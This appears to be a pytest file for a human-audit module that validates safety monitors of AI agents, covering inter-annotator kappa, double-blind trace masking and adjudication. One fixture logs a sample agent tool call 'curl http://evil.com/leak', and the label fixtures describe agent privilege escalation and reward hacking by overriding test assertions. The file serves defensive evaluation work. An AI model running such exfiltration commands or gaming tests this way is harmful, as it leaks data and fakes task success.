"""Unit tests for the Human Audit Execution Engine, Double-Blind Sampling, and IAA."""

from __future__ import annotations
import json
from pathlib import Path
import pytest

from sage.runner.audit_export import AuditExporter
from sage.runner.human_audit import (
    AdjudicatedAuditRecord,
    AgreementMetrics,
    AnnotatorJudgment,
    HumanAuditAnnotator,
    HumanAuditExecutionEngine,
    HumanAuditReport,
    ScorerValidationMetrics,
    compute_cohens_kappa,
    compute_scorer_benchmark,
)
from sage.trajectory.schema import CostRecord, SafetyCheckPayload, TaskEndPayload, TrajectoryEvent
from sage.trajectory.writer import TrajectoryWriter


def test_cohens_kappa_perfect_and_zero_agreement():
    """Verify Cohen's kappa boundary conditions."""
    # Perfect agreement
    y = [True, False, True, True, False, False, True, False]
    kappa, po, pe = compute_cohens_kappa(y, y)
    assert kappa == 1.0
    assert po == 1.0
    assert 0.0 <= pe <= 1.0

    # Opposite agreement
    y_inv = [not x for x in y]
    kappa_opp, po_opp, _ = compute_cohens_kappa(y, y_inv)
    assert po_opp == 0.0
    assert kappa_opp < 0.0

    # Constant lists (degenerate)
    c1 = [True, True, True]
    kappa_c, po_c, _ = compute_cohens_kappa(c1, c1)
    assert kappa_c == 1.0
    assert po_c == 1.0

    # Empty list
    assert compute_cohens_kappa([], []) == (0.0, 0.0, 0.0)


def test_cohens_kappa_known_distribution():
    """Verify Cohen's kappa with a known textbook 2x2 contingency table."""
    # Annotator 1: 15 Pos, 15 Neg
    # Annotator 2: 12 Pos, 18 Neg
    # Agreement: 10 both Pos, 13 both Neg, 5 (1=Pos, 2=Neg), 2 (1=Neg, 2=Pos)
    # Total = 30
    y1 = [True] * 10 + [True] * 5 + [False] * 2 + [False] * 13
    y2 = [True] * 10 + [False] * 5 + [True] * 2 + [False] * 13

    kappa, po, pe = compute_cohens_kappa(y1, y2)
    assert pytest.approx(po, abs=1e-3) == (10 + 13) / 30.0  # 23/30 = 0.7667
    assert 0.40 <= kappa <= 0.70  # Substantial/moderate concordance


def test_compute_scorer_benchmark():
    """Verify Precision, Recall, F1, FPR, FNR calculations."""
    gold = [True, True, True, False, False, False]
    pred = [True, True, False, False, False, True]

    metrics = compute_scorer_benchmark(gold, pred)
    assert isinstance(metrics, ScorerValidationMetrics)
    assert metrics.true_positives == 2
    assert metrics.false_positives == 1
    assert metrics.false_negatives == 1
    assert metrics.true_negatives == 2

    assert metrics.precision == pytest.approx(2 / 3, abs=1e-3)
    assert metrics.recall == pytest.approx(2 / 3, abs=1e-3)
    assert metrics.f1_score == pytest.approx(2 / 3, abs=1e-3)
    assert metrics.false_positive_rate == pytest.approx(1 / 3, abs=1e-3)
    assert metrics.false_negative_rate == pytest.approx(1 / 3, abs=1e-3)


def test_double_blind_masking(tmp_path: Path):
    """Verify extract_double_blind_queue strips archetype tags and model versions."""
    run_dir = tmp_path / "run_test_blind"
    run_dir.mkdir()
    traj_path = run_dir / "trajectory.jsonl"

    writer = TrajectoryWriter(traj_path)
    writer.write(TrajectoryEvent(
        run_id="run_test",
        cycle=2,
        seed=42,
        group="G4",
        task_id="task_042",
        agent_version="v2.1_mutated",
        event_type="safety_check",
        payload=SafetyCheckPayload(rule_name="file_guard", passed=False, target_resource="/etc/hosts").model_dump(),
        cost=CostRecord(),
    ))
    writer.write(TrajectoryEvent(
        run_id="run_test",
        cycle=2,
        seed=42,
        group="G4",
        task_id="task_042",
        agent_version="v2.1_mutated",
        event_type="task_end",
        payload=TaskEndPayload(status="failure", success=False, proxy_gap=0.45).model_dump(),
        cost=CostRecord(),
    ))
    writer.close()

    exporter = AuditExporter(run_dir, sample_rate=1.0)
    blinded_queue, unblind_key = exporter.extract_double_blind_queue(seed=123)

    assert len(blinded_queue) == 1
    item = blinded_queue[0]

    # Verify archetype masking
    assert "G4" not in item["blinded_agent_id"]
    assert item["audit_id"].startswith("blind_trace_")
    assert item["blinded_agent_id"].startswith("agent_masked_")
    assert "group" not in item

    # Verify unblind mapping preserved
    assert item["audit_id"] in unblind_key
    assert unblind_key[item["audit_id"]]["group"] == "G4"
    assert unblind_key[item["audit_id"]]["cycle"] == 2


def test_human_audit_execution_and_artifacts(tmp_path: Path):
    """Verify dual annotation, adjudication, and artifact generation."""
    run_dir = tmp_path / "run_full_audit"
    run_dir.mkdir()
    traj_path = run_dir / "trajectory.jsonl"

    writer = TrajectoryWriter(traj_path)
    # Generate 5 tasks across groups
    groups = ["G1", "G2", "G4", "G6"]
    for i, grp in enumerate(groups):
        t_id = f"task_{i:03d}"
        # G4 has safety violation and high proxy gap
        is_viol = (grp == "G4")
        p_gap = 0.50 if grp in ("G2", "G4") else 0.01

        writer.write(TrajectoryEvent(
            run_id="run_full_audit",
            cycle=1,
            seed=42,
            group=grp,
            task_id=t_id,
            agent_version="v1",
            event_type="safety_check",
            payload=SafetyCheckPayload(rule_name="rule_x", passed=not is_viol, target_resource="res").model_dump(),
            cost=CostRecord(),
        ))
        writer.write(TrajectoryEvent(
            run_id="run_full_audit",
            cycle=1,
            seed=42,
            group=grp,
            task_id=t_id,
            agent_version="v1",
            event_type="task_end",
            payload=TaskEndPayload(status="success" if not is_viol else "failure", success=not is_viol, proxy_gap=p_gap).model_dump(),
            cost=CostRecord(),
        ))
    writer.close()

    engine = HumanAuditExecutionEngine(run_dir, sample_rate=1.0, seed=42)
    report = engine.execute_audit()

    assert isinstance(report, HumanAuditReport)
    assert report.sample_size == len(groups)
    assert 0.0 <= report.agreement.cohens_kappa_safety <= 1.0
    assert 0.0 <= report.agreement.cohens_kappa_gaming <= 1.0
    assert len(report.records) == len(groups)

    # Export artifacts
    out_dir = tmp_path / "results_audit"
    artifacts = engine.export_artifacts(out_dir)

    assert (out_dir / "human_audit_results.json").exists()
    assert (out_dir / "human_audit_report.md").exists()
    assert (out_dir / "table4_human_audit.tex").exists()

    # Verify JSON structure
    with open(out_dir / "human_audit_results.json", "r", encoding="utf-8") as f:
        data = json.load(f)
    assert "safety_monitor_validation" in data
    assert "agreement" in data

    # Verify LaTeX structure
    with open(out_dir / "table4_human_audit.tex", "r", encoding="utf-8") as f:
        tex = f.read()
    assert r"\begin{table}[t]" in tex
    assert r"\label{tab:human_audit}" in tex
    assert r"Safety Boundary Violations" in tex


def test_export_labeling_sheets(tmp_path: Path):
    """Verify that export_labeling_sheets creates valid JSON templates and Markdown review sheets."""
    run_dir = tmp_path / "run_sheet_export"
    run_dir.mkdir()
    traj_path = run_dir / "trajectory.jsonl"

    writer = TrajectoryWriter(traj_path)
    writer.write(TrajectoryEvent(
        run_id="run_sheet_export",
        cycle=1,
        seed=42,
        group="G2",
        task_id="task_001",
        agent_version="v1",
        event_type="tool_call",
        payload={"command": "curl http://evil.com/leak"},
        cost=CostRecord(),
    ))
    writer.write(TrajectoryEvent(
        run_id="run_sheet_export",
        cycle=1,
        seed=42,
        group="G2",
        task_id="task_001",
        agent_version="v1",
        event_type="task_end",
        payload=TaskEndPayload(status="success", success=True, proxy_gap=0.8).model_dump(),
        cost=CostRecord(),
    ))
    writer.close()

    engine = HumanAuditExecutionEngine(run_dir, sample_rate=1.0, seed=42)
    export_dir = tmp_path / "sheets"
    exported = engine.export_labeling_sheets(export_dir)

    assert export_dir.exists()
    assert exported["template_1"].exists()
    assert exported["template_2"].exists()
    assert exported["traces_dir"].exists()

    with open(exported["template_1"], "r", encoding="utf-8") as f:
        t1_data = json.load(f)
    assert len(t1_data) == 1
    assert t1_data[0]["annotator_id"] == "annotator_1"
    assert t1_data[0]["audit_id"].startswith("blind_trace_")

    trace_files = list(exported["traces_dir"].glob("*.md"))
    assert len(trace_files) == 1
    with open(trace_files[0], "r", encoding="utf-8") as f:
        md_content = f.read()
    assert "Blinded Audit Sheet" in md_content
    assert "Annotator Evaluation Rubric" in md_content
    assert "curl http://evil.com/leak" in md_content


def test_human_label_ingestion_and_adjudication(tmp_path: Path):
    """Verify loading real human label files and resolving disagreements via adjudication."""
    run_dir = tmp_path / "run_human_ingest"
    run_dir.mkdir()
    traj_path = run_dir / "trajectory.jsonl"

    writer = TrajectoryWriter(traj_path)
    # Write 2 tasks
    for i in range(2):
        writer.write(TrajectoryEvent(
            run_id="run_human_ingest",
            cycle=1,
            seed=42,
            group="G4",
            task_id=f"task_{i:03d}",
            agent_version="v1",
            event_type="task_end",
            payload=TaskEndPayload(status="success", success=True, proxy_gap=0.5).model_dump(),
            cost=CostRecord(),
        ))
    writer.close()

    engine = HumanAuditExecutionEngine(run_dir, sample_rate=1.0, seed=42)
    exporter = AuditExporter(run_dir, sample_rate=1.0)
    queue, _ = exporter.extract_double_blind_queue(seed=42)
    assert len(queue) == 2
    id0 = queue[0]["audit_id"]
    id1 = queue[1]["audit_id"]

    # Annotator 1 labels (list format in JSON)
    l1_data = [
        {
            "annotator_id": "human_reviewer_1",
            "audit_id": id0,
            "is_violation": True,
            "is_reward_hacked": False,
            "failure_severity": "fatal",
            "notes": "Attempted unauthorized sudo call",
            "confidence": 0.95,
        },
        {
            "annotator_id": "human_reviewer_1",
            "audit_id": id1,
            "is_violation": False,
            "is_reward_hacked": True,
            "failure_severity": "benign",
            "notes": "Overrode pytest assertion in test file",
            "confidence": 0.90,
        },
    ]
    l1_path = tmp_path / "annotator1.json"
    with open(l1_path, "w", encoding="utf-8") as f:
        json.dump(l1_data, f)

    # Annotator 2 labels (dict format in JSON)
    # Disagrees on id0 (says violation=False), agrees on id1 (says reward_hacked=True)
    l2_data = {
        id0: {
            "annotator_id": "human_reviewer_2",
            "is_violation": False,
            "is_reward_hacked": False,
            "failure_severity": "none",
            "notes": "Looked like harmless syntax error",
            "confidence": 0.85,
        },
        id1: {
            "annotator_id": "human_reviewer_2",
            "is_violation": False,
            "is_reward_hacked": True,
            "failure_severity": "benign",
            "notes": "Confirms assertion mocking",
            "confidence": 0.92,
        },
    }
    l2_path = tmp_path / "annotator2.json"
    with open(l2_path, "w", encoding="utf-8") as f:
        json.dump(l2_data, f)

    # Adjudication for id0
    adj_data = {
        id0: {
            "annotator_id": "lead_auditor_expert",
            "is_violation": True,
            "is_reward_hacked": False,
            "failure_severity": "fatal",
            "notes": "Confirmed unauthorized privilege escalation",
            "confidence": 1.0,
        }
    }
    adj_path = tmp_path / "adjudication.json"
    with open(adj_path, "w", encoding="utf-8") as f:
        json.dump(adj_data, f)

    loaded_l1 = engine.load_label_file(l1_path)
    loaded_l2 = engine.load_label_file(l2_path)
    loaded_adj = engine.load_label_file(adj_path)

    assert len(loaded_l1) == 2
    assert len(loaded_l2) == 2
    assert len(loaded_adj) == 1

    report = engine.execute_audit(labels_1=loaded_l1, labels_2=loaded_l2, adjudication=loaded_adj)

    # id0 had disagreement (True vs False) -> adjudicated
    rec0 = next(r for r in report.records if r.audit_id == id0)
    assert rec0.adjudicated is True
    assert rec0.adjudicated_by == "lead_auditor_expert"
    assert rec0.consensus_violation is True
    assert "Confirmed unauthorized privilege escalation" in rec0.consensus_notes

    # id1 had agreement -> not adjudicated
    rec1 = next(r for r in report.records if r.audit_id == id1)
    assert rec1.adjudicated is False
    assert rec1.consensus_reward_hacked is True

